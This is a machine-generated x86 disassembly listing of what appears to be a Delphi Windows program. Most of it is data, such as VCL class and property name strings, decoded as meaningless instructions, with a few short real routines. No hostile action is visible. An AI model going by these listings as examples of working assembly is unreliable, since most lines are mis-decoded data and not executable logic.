adc [ eax ] eax
int3
je r-xdata
inc edx
outsw
jb r-xdata
insd
inc esi
add [ ebx + 0x46f7f8c0 ] cl
test [ ecx ] dl
inc eax
add [ edi + ebp * 8 ] dl
test al 0x41
add [ eax - 0x1 ] dl
add [ esp + esi + 0x31e40040 ] bl
inc eax
add [ eax ] al
xor al [ eax ]
or [ ecx ] 0x47
add al al
inc ebx
popad
outsb
arpl [ ebp + 0x6c ] sp
or [ edi + 0x6f ] dl
jb r-xdata
insd
or [ ecx + 0x44 ] ecx
imul esi [ ebx + 0x70 ] 0x68637461
add [ esi ] eax
inc ecx
add ah bl
cmpsd [ esi ] [ edi ]
inc ecx
add al cl
jmp r-xdata
inc edx
add [ esi ] eax
inc ecx
je r-xdata
add [ eax ] al
add [ edi ] ah
inc esi
add [ eax + 0x3 ] cl
inc edx
add [ eax - 0x63ffbfcc ] ah
cld
inc ecx
add [ eax - 0x63ffbfcc ] ch
xor al 0x40
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
add [ eax - 0x3fffb8f7 ] al
add ah dl
inc ecx
push ebx
outsb
jb r-xdata
add [ ebx ] al
or [ edi ] al
inc ecx
je r-xdata
or cl [ edx ]
arpl [ edx + ecx + 0xa ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
inc esi
add ah cl
adc [ eax ] al
mov eax eax
mov esp 0x80046f8
adc [ eax ] eax
adc al 0xef
popad
arpl [ eax + 0x6d ] bp
outsb
je r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0006 ] al
outsb
inc ebx
jne r-xdata
arpl [ ecx + ecx * 2 + 0x74 ] si
insd
nop
int3
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov edx 0xd40046f9
inc edx
outsw
jb r-xdata
insd
outsd
outsd
inc edx
popad
arpl [ eax + 0x6d ] bp
outsb
je r-xdata
inc esi
add [ eax + r-xdata ] dl
or [ eax ] ah
push esp
inc ebx
outsd
test [ ecx ] dl
inc eax
add [ edi + ebp * 8 ] dl
add [ eax ] al
or [ ecx ] 0x0
pop es
dec edi
je r-xdata
inc ebx
popad
outsb
arpl [ ebp + 0x6c ] sp
push es
add [ edi ] al
dec edi
outsb
push edx
jo r-xdata
mov esp 0x780046f5
add [ eax ] al
outsb
inc ebx
insb
outsd
jae r-xdata
add [ eax ] 0x0
add [ eax + 0x4f070009 ] al
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax - 0x57010000 ] ch
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f120010 ] al
outsb
jns r-xdata
add bh bh
rol [ eax ] 0x0
inc ebx
push 0x4e6b6365
inc edx
outsw
jb r-xdata
test [ esi ] 0xff0000a8
test al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc [ eax ] al
adc cl [ edi + 0x6e ]
test [ esi ] 0x90
add [ eax ] al
call [ eax + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a000d ] al
outsb
push edx
jo r-xdata
popad
outsb
arpl [ ebp + 0x6c ] sp
or [ edi + 0x6f ] dl
jb r-xdata
inc ecx
je r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f06000e ] al
outsb
push ebx
outsb
or al 0xf7
inc esi
add [ eax - 0x5f010000 ] ah
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f07000f ] al
outsb
push edi
test [ esi ] 0xff0000b0
mov al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc [ eax ] eax
cmovg ebp [ esi + 0x41 ]
je r-xdata
popad
insd
jae r-xdata
arpl [ gs : ebx + 0x4e ] bp
jns r-xdata
push 0x61430601
inc edx
outsd
outsd
insb
add ah cl
adc [ eax ] al
lodsb [ esi ]
cld
inc esi
add [ eax ] cl
sbb [ esp + eax * 2 + 0x69 ] edx
jae r-xdata
popad
arpl [ eax + 0x6d ] bp
outsb
je r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
adc al [ eax ]
adc [ edi + 0x6e ] cl
inc ecx
je r-xdata
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc al 0x0
push cs
dec edi
popad
arpl [ eax + 0x6d ] bp
outsb
je r-xdata
jb r-xdata
insb
insb
enter 0x46f6 0x0
cwde
add [ eax ] al
[ eax + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
adc [ eax ] eax
add [ ecx ] dl
inc eax
inc edx
outsd
outsd
insb
add [ ecx + edx + 0x11d40040 ] al
inc eax
add ah dl
adc [ eax ] eax
int3
adc [ eax ] al
mov eax eax
sub ch bh
inc esi
insd
add [ eax ] cl
and [ esp + eax * 2 + 0x69 ] edx
jae r-xdata
inc ebx
jne r-xdata
dec esp
imul esi [ ebx + 0x74 ] 0x6d657449
push 0x65
popad
jbe r-xdata
je r-xdata
popad
arpl [ eax + 0x6d ] bp
outsb
je r-xdata
add [ eax ] al
push eax
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax + ecx ] al
inc esp
insb
je r-xdata
add [ eax + 0x4f160013 ] al
outsb
inc edx
outsw
jb r-xdata
add [ eax ] al
hlt
add [ gs : edx ] al
insd
arpl [ edx + ecx + 0x7 ] si
dec esp
imul esi [ ebx + 0x74 ] 0x6d657449
jae r-xdata
je r-xdata
add [ ecx + edx + 0x10cc0040 ] al
inc eax
add [ esp + edi * 8 + 0x19080046 ] ch
push esp
inc esp
imul esi [ ebx + 0x74 ] 0x7473694c
dec ecx
je r-xdata
outsb
inc edx
mov eax 0xc80046f8
add [ eax ] al
dec eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0014 ] al
jae r-xdata
je r-xdata
outsw
jb r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
popad
dec eax
clc
inc esi
add al al
add [ eax ] al
inc eax
add [ eax ] al
or al [ esi ]
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
or [ ecx + 0x44 ] ecx
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edx + ecx + 0x6 ] si
pop es
inc ecx
push ebx
outsb
jb r-xdata
add al 0x8
nop
push 0x80046fc
adc [ esp + eax * 2 + 0x69 ] edx
jae r-xdata
add [ esi ] eax
inc ebx
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x6 ] si
popad
outsb
arpl [ ebp + 0x6c ] sp
or [ edi + 0x6f ] dl
jb r-xdata
popad
jb r-xdata
inc esi
add [ eax ] cl
sbb edx [ esp + eax * 2 + 0x69 ]
popad
jb r-xdata
or [ fs : ecx + 0x44 ] ecx
je r-xdata
inc esi
outsd
jb r-xdata
dec ecx
je r-xdata
insd
inc ecx
outsd
push es
insd
insd
or dl [ gs : edi + 0x69 ]
push ebx
je r-xdata
outsd
outsb
jae r-xdata
imul esi [ ebx + 0x70 ] 0x68637461
or cl [ eax ]
push edx
jae r-xdata
dec ecx
inc esp
dec edi
jo r-xdata
dec esp
imul esi [ ebx + 0x74 ] 0x6d657449
or [ edx ] dl
push esp
inc esp
imul esi [ ebx + 0x74 ] 0x7473694c
inc edx
outsd
outsb
jb r-xdata
add [ ebx ] al
or [ edi ] al
inc ecx
push ebx
outsb
jb r-xdata
jae r-xdata
dec esp
imul esi [ ebx + 0x74 ] 0x6d657449
push eax
jb r-xdata
outsd
insb
add [ ecx + edx + 0x10cc0040 ] al
inc eax
add [ ebp - 0x1dbffc0 ] cl
imul esi [ ebx + 0x70 ] 0x68637461
or [ ecx + 0x44 ] ecx
jae r-xdata
inc edx
outsd
outsd
insb
add [ ecx + edx + 0x11d40040 ] al
inc eax
add ah cl
adc [ eax ] al
mov eax eax
fdiv st5
inc esi
add [ eax ] cl
adc dl [ esp + eax * 2 + 0x69 ]
jae r-xdata
insd
push eax
jb r-xdata
jb r-xdata
inc ebx
jne r-xdata
insd
imul ebp [ edi + 0x6e ] 0x69444909
jae r-xdata
outsb
add [ edx ] al
or [ edi ] al
inc ecx
push ebx
outsb
jb r-xdata
push esp
inc esp
imul esi [ ebx + 0x74 ] 0x7473694c
dec ecx
je r-xdata
imul ebp [ esi + 0x67 ] 0x40118400
add [ eax ] al
adc [ eax ] eax
jl r-xdata
arpl [ gs : edx + eax + 0x4 ] si
outsb
arpl [ ebp + 0x6c ] sp
or [ edi + 0x6f ] dl
jb r-xdata
or [ ecx + 0x44 ] ecx
imul esi [ ebx + 0x70 ] 0x68637461
add [ esi ] eax
inc ebx
popad
jns r-xdata
insd
or al [ edi ]
push esp
dec edi
bound ebp [ edx + 0x65 ]
push 0x61430601
outsd
outsb
jae r-xdata
or [ ecx + 0x44 ] ecx
imul esi [ ebx + 0x70 ] 0x68637461
add [ esi ] eax
inc ebx
popad
jo r-xdata
popad
insd
or dl [ gs : edi + 0x69 ]
push ebx
je r-xdata
dec esp
imul esi [ ebx + 0x74 ] 0x6d657449
dec ecx
inc esp
jo r-xdata
dec esi
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edx + eax + 0x4 ] si
popad
je r-xdata
inc ebx
add [ esi ] eax
arpl [ ecx + eax + 0x6 ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
bound ebp [ edx + 0x65 ]
arpl [ edx + eax + 0x4 ] si
dec esi
inc ebx
insb
outsd
jae r-xdata
insd
add [ ebp + edi * 8 + 0x46 ] bh
add [ eax ] cl
adc al 0x54
inc esp
imul esi [ ebx + 0x74 ] 0x7473694c
dec ecx
je r-xdata
inc esi
inc eax
add ah cl
adc [ eax ] al
xor al 0xff
inc esi
add [ eax ] cl
adc [ esp + eax * 2 + 0x69 ] edx
jae r-xdata
insb
insb
add [ ebx ] al
or [ edi ] al
jb r-xdata
jns r-xdata
dec ecx
je r-xdata
inc edx
outsb
arpl [ ebp + 0x6c ] sp
or [ edi + 0x6f ] dl
jb r-xdata
inc esp
outsd
outsd
insb
add [ ecx + edx + 0x11d40040 ] al
inc edx
outsd
outsd
insb
add [ ecx + edx + 0x11d40040 ] al
inc eax
add ah cl
adc [ eax ] al
lea eax [ eax ]
aam 0xfe
inc esi
add [ eax ] cl
adc eax 0x73694454
push edx
jae r-xdata
jb r-xdata
je r-xdata
or [ 0x73694454 ] dl
imul ebp [ esi + 0x67 ] 0x40118400
add [ eax ] al
adc [ eax ] eax
mov eax eax
add al 0x4e
or [ edi ] al
inc ecx
push ebx
add [ edx ] al
jb r-xdata
pop es
push 0x6552080a
jae r-xdata
insb
add [ ecx + edx + 0x10cc0040 ] al
inc eax
add [ ebp - 0x3fffc0 ] cl
inc esi
add [ eax ] cl
sbb eax 0x73694454
je r-xdata
dec esp
imul esi [ ebx + 0x74 ] 0x6d657449
push ebx
outsb
add [ fs : edx ] al
or [ edi ] al
inc ecx
push ebx
outsb
jb r-xdata
or cl [ eax ]
push edx
jae r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edx + ecx + 0x8 ] si
add ecx [ eax ]
pop es
inc ecx
push ebx
outsb
jb r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x6 ] si
insd
aam 0x11
imul esi [ ebx + 0x74 ] 0x6d657449
push edx
jo r-xdata
outsb
arpl [ ebp + 0x6c ] sp
or [ edi + 0x6f ] dl
jb r-xdata
push 0x61430601
jns r-xdata
je r-xdata
inc esi
add [ eax ] cl
adc dl [ esp + eax * 2 + 0x69 ]
jae r-xdata
add [ esi ] eax
inc ebx
popad
outsb
arpl [ ebp + 0x6c ] sp
or [ edi + 0x6f ] dl
jb r-xdata
jns r-xdata
popad
add al [ esi + ecx * 2 ]
push esp
imul esi [ ebx + 0x74 ] 0x7473694c
dec ecx
je r-xdata
imul esi [ ebx + 0x74 ] 0x6d657449
add [ esi ] eax
inc ebx
popad
outsb
arpl [ ebp + 0x6c ] sp
or [ edi + 0x6f ] dl
jb r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x6 ] si
js r-xdata
outsd
outsb
jae r-xdata
or cl [ eax ]
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edx + ecx + 0x8 ] si
add [ eax ] cl
sbb edx [ esp + eax * 2 + 0x69 ]
jae r-xdata
inc edx
outsd
outsd
insb
add [ ecx + edx + 0x10cc0040 ] al
inc eax
add [ eax ] dl
add [ edi ] al
inc ebx
popad
outsb
arpl [ ebp + 0x6c ] sp
or [ edi + 0x6f ] dl
jb r-xdata
push es
je r-xdata
dec ecx
je r-xdata
push 0x65676e61
add [ edx ] al
or [ edi ] al
inc ecx
push ebx
outsb
jb r-xdata
inc ecx
push ebx
outsb
push edx
jo r-xdata
dec esp
imul esi [ ebx + 0x74 ] 0x6d657449
inc esi
outsd
jb r-xdata
insd
inc ecx
push ebx
outsb
jb r-xdata
push 0x65676e61
add [ edx ] al
or [ edi ] al
or [ edi ] al
inc ecx
push ebx
outsb
jb r-xdata
insd
inc ecx
je r-xdata
bound ebp [ edx + 0x65 ]
arpl [ edx + ecx + 0xa ] si
inc ebx
push 0x4e6b6365
popad
insd
jae r-xdata
dec ecx
je r-xdata
inc edx
outsd
outsd
insb
add [ ecx + edx + 0x10cc0040 ] al
inc eax
add [ eax - 0x1 ] bh
inc [ esi ]
or [ edx ] dl
push esp
inc esp
imul esi [ ebx + 0x74 ] 0x7473694c
inc esi
add [ eax ] cl
adc dl [ esp + eax * 2 + 0x69 ]
jae r-xdata
adc [ eax ] eax
int3
imul esi [ ebx + 0x70 ] 0x68637461
add [ esi ] eax
inc ebx
popad
or [ ecx + 0x44 ] ecx
inc ecx
push ebx
outsb
jb r-xdata
dec esp
imul esi [ ebx + 0x74 ] 0x6d657449
je r-xdata
add [ edx ] al
or [ edi ] al
inc ecx
push ebx
outsb
jb r-xdata
add al [ esi + ecx * 2 ]
push esp
dec edi
or cl [ edx ]
inc ecx
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edx + ecx + 0xa ] si
popad
arpl [ eax + 0x6d ] bp
outsb
je r-xdata
or [ ecx ] ah
push esp
inc esp
imul esi [ ebx + 0x74 ] 0x7473694c
popad
arpl [ eax + 0x6d ] bp
outsb
je r-xdata
add cl [ eax ]
pop es
inc ecx
push ebx
outsb
jb r-xdata
outsb
inc edx
outsw
jb r-xdata
insd
push edi
jb r-xdata
dec esp
imul esi [ ebx + 0x74 ] 0x6d657449
or cl [ edx ]
inc ecx
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edx + ecx + 0xa ] si
push 0x65
popad
arpl [ eax + 0x6d ] bp
outsb
je r-xdata
add [ esi ] eax
inc ebx
popad
outsb
arpl [ ebp + 0x6c ] sp
or [ edi + 0x6f ] dl
jb r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x6 ] si
or [ edi + 0x6f ] dl
jb r-xdata
popad
arpl [ eax + 0x6d ] bp
outsb
je r-xdata
jb r-xdata
add [ fs : edx ] al
or [ edi ] al
inc ecx
push ebx
outsb
inc esp
imul esi [ ebx + 0x74 ] 0x7473694c
insd
add [ ecx + edx - 0x10ebffc0 ] al
inc ecx
je r-xdata
add [ esi ] eax
inc ecx
je r-xdata
or cl [ edx ]
push esp
dec edi
push es
popad
arpl [ eax + 0x6d ] bp
outsb
je r-xdata
popad
arpl [ eax + 0x6d ] bp
outsb
je r-xdata
popad
add [ fs : edx ] al
or [ edx ] bl
push esp
inc esp
inc edx
outsd
outsd
insb
add [ ecx + edx + 0x11d40040 ] al
inc eax
add ah cl
adc [ eax ] al
rol [ ecx ] 0x1
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + eax ] dl
inc edi
add [ eax ] bh
add al [ edi ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc edx
outsd
outsd
insb
add [ ecx + edx - 0x10ebffc0 ] al
add [ ecx + edx - 0x10ebffc0 ] al
inc ecx
je r-xdata
aam 0x0
add [ eax ] al
and al 0xe7
inc esi
add [ eax + 0x3 ] cl
inc edx
add [ eax - 0x63ffbfcc ] ah
cld
inc ecx
add [ eax - 0x63ffbfcc ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insd
je r-xdata
inc ecx
je r-xdata
push ebx
inc ecx
je r-xdata
insd
dec ecx
je r-xdata
popad
arpl [ eax + 0x6d ] bp
outsb
je r-xdata
add ah bl
cmpsd [ esi ] [ edi ]
inc ecx
add al cl
jmp r-xdata
inc edx
add [ esi ] eax
inc ecx
je r-xdata
popad
jbe r-xdata
add [ 0x73694454 ] cl
je r-xdata
add [ esi ] ah
add al [ edi ]
inc edx
outsw
jb r-xdata
dec esp
imul esi [ ebx + 0x74 ] 0x6d657449
dec ecx
inc edx
outsw
jb r-xdata
dec esp
imul esi [ ebx + 0x74 ] 0x6d657449
inc esi
add ah cl
adc [ eax ] al
nop
sub [ ecx ] al
inc edi
add [ eax ] cl
sbb [ esp + eax * 2 + 0x69 ] edx
jae r-xdata
adc [ eax ] eax
adc al 0xef
popad
arpl [ eax + 0x6d ] bp
outsb
je r-xdata
add [ eax ] al
add al [ es : edi ]
inc esp
insb
adc [ eax ] eax
int3
je r-xdata
add ecx [ eax ]
pop es
je r-xdata
add [ ebx ] al
or [ edi ] al
inc esi
add [ eax + r-xdata ] dl
or [ ebx ] bl
push esp
inc esp
imul esi [ ebx + 0x74 ] 0x7473694c
dec ecx
je r-xdata
test [ ecx ] dl
inc eax
add [ edi + ebp * 8 ] dl
outsd
outsd
inc edx
popad
arpl [ eax + 0x6d ] bp
outsb
je r-xdata
outsb
dec edi
jo r-xdata
imul esi [ ebx + 0x74 ] 0x6d657449
cmp [ edx ] al
inc edi
add [ edi ] al
or eax 0x73694454
je r-xdata
inc esi
add [ eax + 0x8004700 ] bh
and [ esp + eax * 2 + 0x69 ] edx
jae r-xdata
test [ ecx ] dl
inc eax
add [ edi + ebp * 8 ] dl
inc ecx
push ebx
outsb
jb r-xdata
add [ ebx ] al
or [ edi ] al
or al [ ecx + ecx * 2 ]
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edx + ecx + 0x4 ] si
dec ecx
inc ebx
popad
outsb
arpl [ ebp + 0x6c ] sp
push es
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or [ eax ] al
or [ edi + 0x6e ] ecx
outsb
test al 0xfc
inc esi
add [ eax ] bl
add bh bh
pop eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0006 ] al
outsb
inc ebx
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push es
add [ esi ] cl
dec edi
imul esi [ ebx + 0x74 ] 0x6d657449
rol [ ecx ] 0x1
inc edi
add ah dl
out 0x46 eax
add [ 0x754f0900 ] dl
je r-xdata
xor al 0x40
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
add [ eax - 0x3fffb8f2 ] ah
test al 0x41
add [ eax - 0x1 ] dl
inc ecx
pushfd
inc ebx
popad
outsb
arpl [ ebp + 0x6c ] sp
or [ edi + 0x6f ] dl
jb r-xdata
insd
or [ ecx + 0x44 ] ecx
imul esi [ ebx + 0x70 ] 0x68637461
add [ esi ] eax
add bh bh
mov [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or al 0x0
pop es
popad
jb r-xdata
add [ eax ] al
or [ ecx ] 0x0
je r-xdata
dec edi
outsd
outsd
imul ebx [ eax + 0x50 ] 0x10
add [ esp + edi * 8 + 0x46 ] ah
add [ eax ] dl
add bh bh
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060005 ] al
add [ eax - 0x57010000 ] ch
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f120010 ] al
outsb
inc edx
outsw
jb r-xdata
jns r-xdata
or [ ebx ] 0x0
push es
dec edi
fdivr st5
inc esi
add [ eax ] dh
add bh bh
jo r-xdata
dec edi
add [ edi ] al
and dh bh
inc esi
add [ eax ] bh
add bh bh
js r-xdata
outsb
inc ebx
insb
outsd
jae r-xdata
add [ eax ] 0x0
add [ eax + 0x4f070009 ] al
outsb
inc ebx
jne r-xdata
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
and al 0xfd
inc esi
add [ eax ] ah
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f160007 ] al
outsb
je r-xdata
add bh bh
rol [ eax ] 0x0
inc ebx
push 0x4e6b6365
outsb
push edx
popad
jo r-xdata
add [ eax ] al
inc [ esi ]
nop
add [ eax ] al
call [ eax + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a000d ] al
jo r-xdata
outsb
inc esi
add [ eax - 0x77010000 ] cl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f07000c ] al
pop es
dec edi
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or [ eax ] eax
push eax
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or al [ eax ]
jns r-xdata
jo r-xdata
adc [ edi + 0x6e ] cl
insd
push eax
jb r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_46ed48
lea eax [ ebx + 0x9c ]
mov edx [ ebp - 0x4 ]
inc ecx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0f0011 ] al
outsb
inc ecx
je r-xdata
add [ edi ] al
mov al 0x0
add bh bh
mov al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc [ eax ] eax
cmovg ebp [ esi + 0x41 ]
popad
insd
jae r-xdata
arpl [ gs : ebx + 0x4e ] bp
jb r-xdata
insb
insb
xor bh bh
inc esi
add [ eax - 0x67010000 ] bl
add [ eax ] al
inc [ ecx ]
outsb
push edx
jo r-xdata
add [ edx ] cl
dec edi
jb r-xdata
jb r-xdata
jo r-xdata
mov ecx r-xdata
call sub_405a10
sbb [ eax + eax + 0x558b0000 ] 0xfffffffc
popad
arpl [ eax + 0x6d ] bp
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc al 0x0
push cs
dec edi
popad
arpl [ eax + 0x6d ] bp
outsb
je r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
adc al [ eax ]
adc [ edi + 0x6e ] cl
je r-xdata
inc [ esi ]
mov al [ 0xffffffffa0ff0000 ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f07000f ] al
outsb
push edi
inc esi
add [ eax - 0x5f010000 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f06000e ] al
outsb
push ebx
outsb
je r-xdata
add [ eax ] al
[ eax + 0x1ff0000 ]
jns r-xdata
add [ eax + 0x4f10000a ] al
jb r-xdata
add [ eax ] al
popad
jbe r-xdata
lea eax [ ebp - 0x4 ]
call sub_4059cc
retn
inc esp
insb
je r-xdata
add [ eax + 0x4f160013 ] al
outsb
inc edx
outsw
jb r-xdata
add [ eax ] al
inc ecx
je r-xdata
pushad
add [ edi ] al
mov eax 0xb8ff0000
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f100012 ] al
outsb
jne r-xdata
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x9c ] 0x0
popad
arpl [ eax + 0x6d ] bp
outsb
je r-xdata
add [ eax ] al
mov esp 0xa80046ff
add [ eax ] al
[ eax + 0x1ff0000 ]
push edx
jo r-xdata
push 0x65676e61
dec esp
jns r-xdata
popad
outsb
dec esp
jns r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
lea edx [ ebp - 0x4 ]
mov [ fs : eax ] edx
push sub_47053f
call 0xffffffff83d50510
pushfd
add [ eax ] al
add [ ebx + 0x44b9fc55 ] cl
add eax 0xeee80047
push esp
stc
push [ ebx ]
rcr [ edx + 0x59 ] 0x59
outsb
inc edx
and al 0x1
inc edi
add al cl
add [ eax ] al
dec eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0014 ] al
stc
inc ebx
jmp sub_4039a0
mov edx rw-data
mov [ eax + 0x30 ] edx
retn
outsw
jb r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
popad
mov ah 0x0
inc edi
add al al
add [ eax ] al
inc eax
add [ eax ] al
add [ eax + 0x4f06000b ] al
add [ eax - 0x7f010000 ] al
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
push 0x65676e61
js r-xdata
js r-xdata
inc esi
outsd
jb r-xdata
inc esi
add [ eax ] ch
add bh bh
push 0x1ff0000
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090008 ] al
outsb
sub_46f973
add ah dh
inc [ ecx ]
cmp [ eax ] al
inc edx
add [ eax ] dh
add [ edx ] eax
pushad
add eax [ edx ]
dec eax
add [ edx ] al
inc eax
add [ edx ] al
test al 0xed
inc esi
add [ eax + 0x9 ] cl
inc edi
add [ eax + ecx - 0x140fffb9 ] bl
inc esi
add [ eax - 0x57ffb8f7 ] ch
or [ edi ] al
and [ ecx ] cl
inc edi
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax - 0x11 ] cl
inc esi
add al dl
add [ eax ] al
add [ esp + edx * 2 ] cl
inc ebx
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0006 ] al
outsb
inc ebx
jne r-xdata
arpl [ ecx + ecx * 2 + 0x74 ] si
insd
nop
int3
add [ eax ] al
or [ ecx ] 0x0
pop es
dec edi
je r-xdata
add [ edi ] al
dec edi
outsb
push edx
jo r-xdata
mov esp 0x780046f5
add [ eax ] al
outsb
inc ebx
insb
outsd
jae r-xdata
add [ eax ] 0x0
add [ eax + 0x4f070009 ] al
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax - 0x57010000 ] ch
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f120010 ] al
outsb
jns r-xdata
add bh bh
rol [ eax ] 0x0
inc ebx
push 0x4e6b6365
inc edx
outsw
jb r-xdata
test [ esi ] 0xff0000a8
test al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc [ eax ] al
adc cl [ edi + 0x6e ]
test [ esi ] 0x90
add [ eax ] al
call [ eax + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a000d ] al
outsb
push edx
jo r-xdata
popad
outsb
arpl [ ebp + 0x6c ] sp
or [ edi + 0x6f ] dl
jb r-xdata
inc ecx
je r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f06000e ] al
outsb
push ebx
outsb
or al 0xf7
inc esi
add [ eax - 0x5f010000 ] ah
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f07000f ] al
outsb
push edi
test [ esi ] 0xff0000b0
mov al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc [ eax ] eax
cmovg ebp [ esi + 0x41 ]
je r-xdata
popad
insd
jae r-xdata
arpl [ gs : ebx + 0x4e ] bp
jns r-xdata
push 0x61430601
inc edx
outsd
outsd
insb
add ah cl
adc [ eax ] al
lodsb [ esi ]
cld
inc esi
add [ eax ] cl
sbb [ esp + eax * 2 + 0x69 ] edx
jae r-xdata
popad
arpl [ eax + 0x6d ] bp
outsb
je r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
adc al [ eax ]
adc [ edi + 0x6e ] cl
inc ecx
je r-xdata
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc al 0x0
push cs
dec edi
popad
arpl [ eax + 0x6d ] bp
outsb
je r-xdata
jb r-xdata
insb
insb
enter 0x46f6 0x0
cwde
add [ eax ] al
[ eax + 0x1ff0000 ]
add [ eax ] al
